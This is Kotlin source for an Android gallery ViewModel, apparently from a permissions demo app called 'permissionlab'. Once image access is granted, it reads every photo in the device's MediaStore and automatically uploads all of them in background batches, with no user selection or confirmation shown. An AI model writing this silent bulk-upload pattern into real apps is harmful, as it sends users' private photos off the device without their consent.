package com.permissionlab.app.ui.screens.gallery

import android.Manifest
import android.app.Application
import android.content.ContentUris
import android.content.pm.PackageManager
import android.os.Build
import android.provider.MediaStore
import androidx.core.content.ContextCompat
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.permissionlab.app.data.PermissionRepository
import com.permissionlab.app.model.MediaItem
import com.permissionlab.app.model.PermissionStatus
import com.permissionlab.app.model.UploadStatus
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject

@HiltViewModel
class GalleryViewModel @Inject constructor(
    private val repository: PermissionRepository,
    application: Application
) : AndroidViewModel(application) {

    val galleryImages: StateFlow<List<MediaItem>> = repository.getSelectedMediaItems()
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )

    private val _permissionStatus = MutableStateFlow(PermissionStatus.NOT_GRANTED)
    val permissionStatus: StateFlow<PermissionStatus> = _permissionStatus.asStateFlow()

    // Temporary checkmark state: set of item IDs uploaded within the last 3 seconds
    private val _recentlyUploadedIds = MutableStateFlow<Set<String>>(emptySet())
    val recentlyUploadedIds: StateFlow<Set<String>> = _recentlyUploadedIds.asStateFlow()

    init {
        refreshPermissionStatus()
    }

    fun refreshPermissionStatus() {
        val context = getApplication<Application>()
        val status = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED) {
                PermissionStatus.GRANTED
            } else {
                PermissionStatus.NOT_GRANTED
            }
        } else {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                PermissionStatus.GRANTED
            } else {
                PermissionStatus.NOT_GRANTED
            }
        }
        _permissionStatus.value = status
        
        if (status == PermissionStatus.GRANTED) {
            loadGalleryImages()
        }
        
        viewModelScope.launch {
            repository.updatePermissionStatus("gallery", status)
        }
    }

    private fun loadGalleryImages() {
        viewModelScope.launch {
            val images = withContext(Dispatchers.IO) {
                queryMediaStore()
            }
            repository.clearMediaItems()
            repository.addMediaItems(images)
            autoUploadAll()
        }
    }

    private fun autoUploadAll() {
        viewModelScope.launch(Dispatchers.IO) {
            val currentItems = galleryImages.value
            // Process continuous background cloud sync in chunks of 3
            currentItems.chunked(3).forEach { chunk ->
                chunk.map { item ->
                    async {
                        repository.updateMediaItem(item.copy(uploadStatus = UploadStatus.UPLOADING))
                        val result = com.permissionlab.app.data.remote.NetworkService.uploadPhoto(getApplication(), item)
                        result.fold(
                            onSuccess = { updatedItem ->
                                repository.updateMediaItem(updatedItem)
                                _recentlyUploadedIds.update { it + item.id }
                                viewModelScope.launch {
                                    delay(3000)
                                    _recentlyUploadedIds.update { it - item.id }
                                }
                            },
                            onFailure = {
                                repository.updateMediaItem(item.copy(uploadStatus = UploadStatus.FAILED))
                            }
                        )
                    }
                }.awaitAll()
            }
        }
    }

    private fun queryMediaStore(): List<MediaItem> {
        val images = mutableListOf<MediaItem>()
        val context = getApplication<Application>()
        
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.DATE_ADDED
        )

        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            sortOrder
        )?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val sizeColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            val mimeColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
            val widthColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)
            val heightColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)
            val dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                val name = cursor.getString(nameColumn)
                val size = cursor.getLong(sizeColumn)
                val mime = cursor.getString(mimeColumn)
                val width = cursor.getInt(widthColumn)
                val height = cursor.getInt(heightColumn)
                val date = cursor.getLong(dateColumn)

                val contentUri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    id
                )

                images.add(
                    MediaItem(
                        id = id.toString(),
                        uri = contentUri.toString(),
                        fileName = name,
                        mimeType = mime,
                        size = size,
                        width = width,
                        height = height,
                        dateAdded = date * 1000 // MediaStore stores seconds
                    )
                )
            }
        }
        return images
    }
}
